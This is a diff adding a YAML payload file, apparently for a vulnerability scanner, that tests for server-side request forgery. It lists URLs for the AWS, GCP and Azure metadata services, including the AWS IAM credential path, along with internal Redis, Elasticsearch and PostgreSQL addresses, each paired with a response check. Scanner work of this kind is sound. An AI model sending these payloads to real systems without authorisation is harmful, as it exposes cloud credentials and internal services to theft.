@@ -1,0 +1,54 @@
+id: ssrf-cloud
+name: SSRF — cloud metadata and internal access
+context:
+  any: true
+
+payloads:
+  - value: "http://169.254.169.254/latest/meta-data/"
+    detect: { body_contains: "ami-id" }
+    id: ssrf-aws-imds-01
+    title: "SSRF — AWS EC2 metadata (IMDSv1)"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    detect: { body_contains: "AccessKeyId" }
+    id: ssrf-aws-creds-01
+    title: "SSRF — AWS IAM credential exfiltration via IMDS"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+    detect: { body_contains: "project" }
+    id: ssrf-gcp-01
+    title: "SSRF — GCP metadata endpoint"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    detect: { body_contains: "compute" }
+    id: ssrf-azure-01
+    title: "SSRF — Azure IMDS endpoint"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://127.0.0.1:6379/INFO"
+    detect: { body_contains: "redis_version" }
+    id: ssrf-redis-01
+    title: "SSRF — internal Redis instance accessible"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://127.0.0.1:9200/_cluster/health"
+    detect: { body_contains: "cluster_name" }
+    id: ssrf-elastic-01
+    title: "SSRF — internal Elasticsearch accessible"
+    severity: critical
+    cwe: CWE-918
+
+  - value: "http://127.0.0.1:5432"
+    detect: { body_regex: "PostgreSQL|FATAL" }
+    id: ssrf-pg-01
+    title: "SSRF — internal PostgreSQL accessible"
+    severity: high
+    cwe: CWE-918
